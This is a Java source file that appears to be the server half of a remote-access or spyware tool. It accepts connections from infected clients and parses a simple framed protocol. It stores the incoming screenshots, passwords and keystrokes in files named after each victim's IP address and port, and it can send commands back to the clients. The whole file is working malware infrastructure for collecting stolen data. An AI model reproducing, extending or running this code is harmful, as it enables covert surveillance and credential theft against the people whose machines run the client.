package nix;

import static model.MessageState.NORMAL;
import static model.MessageState.RECEIVING_DATA;
import static model.MessageState.GETTING_LENGTH;
import static model.MessageState.GETTING_TYPE;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.net.Socket;

import model.MessageState;
import model.Server;

public class ClientConnection {

  private Server server;
  ClientStatus status;
  public final Socket socket;
  private final int id;
  private InputStream in;
  private PrintWriter out;
  protected int bufferLength;
  private static int nextId = 0;
  private String filename;

  public ClientConnection(ClientStatus status, final Server server, final Socket socket) {

    this.bufferLength = 0;
    this.server = server;
    this.status = status;
    this.socket = socket;
    try {
      this.in = socket.getInputStream();
      // automatically flush output
      this.out = new PrintWriter(socket.getOutputStream(), true);
    } catch (IOException e) {
      e.printStackTrace();
    }

    this.id = generateNextId();

    // add received messages to server's message queue
    new Thread() {
      @Override
      public void run() {
        int character;
        MessageState state = NORMAL;
        int messageType = 0;
        int messageLength = 0;
        int offset = 0;
        int length = 0;
        byte[] bytes = null;

        try {
          while (true) {
            // System.out.println("Character: " + character + " " + (char)character);
            if (state == NORMAL) {
              if ((character = in.read()) == -1) break;

              if (character != '!') {
                System.out.println("Expecting ! for state NORMAL, got: " + character + " " + (char)character);
              } else {
                state = GETTING_TYPE;
              }
            } else if (state == GETTING_TYPE) {
              if ((character = in.read()) == -1) break;

              if (character == '!') {
                state = GETTING_LENGTH;
              } else if (character >= '0' && character <= '9'){
                messageType *= 10;
                messageType += character - '0';
              } else {
                System.out.println("Expecting 0-9 for state WAITING_FOR_TYPE, got: " + character + " " + (char)character);
              }
            } else if (state == GETTING_LENGTH) {
              if ((character = in.read()) == -1) break;

              if (character == '!') {
                String prefix = "";
                String extension = "";
                switch (messageType) {
                  case 143: 
                    prefix = "screenshot";
                    extension = "png";
                    break;
                  case 144:
                    prefix = "passwords";
                    extension = "txt";
                    break;
                  case 145:
                    prefix = "keystrokes";
                    extension = "txt";
                    break;
                  case 146:
                    prefix = "idk";
                    extension = "txt";
                    break;
                  case 147:
                    System.out.println("hihi");
                    break;
                  default:
                    System.out.println("OH NO");
                    System.out.println(character + " " + (char)character + " " + messageType);
                    state = null;
                    break;
                }
                
                filename = prefix + " " + socket.getInetAddress().getHostAddress() + " " + socket.getPort() + " " + System.currentTimeMillis() + "." + extension;
                bytes = new byte[messageLength];
                offset = 0;
                state = RECEIVING_DATA;
//                server.status("Receiving " + prefix, ClientConnection.this);

              } else if (character >= '0' && character <= '9'){
                messageLength *= 10;
                messageLength += character - '0';
              } else {
                System.out.println("Expecting 0-9 for state WAITING_FOR_LENGTH, got: " + character + " " + (char)character);
              }
            } else if (state == RECEIVING_DATA) {
              length = in.read(bytes, offset, messageLength - offset);
              // TODO: write to different file depending on message type
              writeFile(bytes, offset, length);
              offset += length;
              if (offset >= bytes.length ) {
                state = NORMAL;
                messageLength = 0;
                messageType = 0;
              }
            } else if (state == null) {
              System.out.println("something went wrong");
            }
          }
        } catch (IOException e) {
          e.printStackTrace();
        }
      }
    }.start();
  }

  public void sendCommand(int command) {
    out.println(command);
  }

  public void sendCommand(String command) {
    System.out.println(command);
    out.print(command);
    out.flush();
  }

  private static synchronized int generateNextId() {
    return nextId++;
  }

  // one client is equivalent to another iff they have the same id
  // TODO: consider using address instead/additionally?

  @Override
  public int hashCode() {
    final int prime = 31;
    int result = 1;
    result = prime * result + id;
    return result;
  }

  @Override
  public boolean equals(Object obj) {
    if (this == obj)
      return true;
    if (obj == null)
      return false;
    if (getClass() != obj.getClass())
      return false;
    ClientConnection other = (ClientConnection) obj;
    if (id != other.id)
      return false;
    return true;
  }

  public String getAddress() {
    return socket.getInetAddress().getHostAddress();
  }

  public void writeFile(byte[] bytes, int offset, int length) {
    FileOutputStream out;
    try {
      out = new FileOutputStream(filename, true);
      out.write(bytes, offset, length);
      out.close();
    } catch (FileNotFoundException e) {
      e.printStackTrace();
    } catch (IOException e) {
      e.printStackTrace();
    }
  }
}
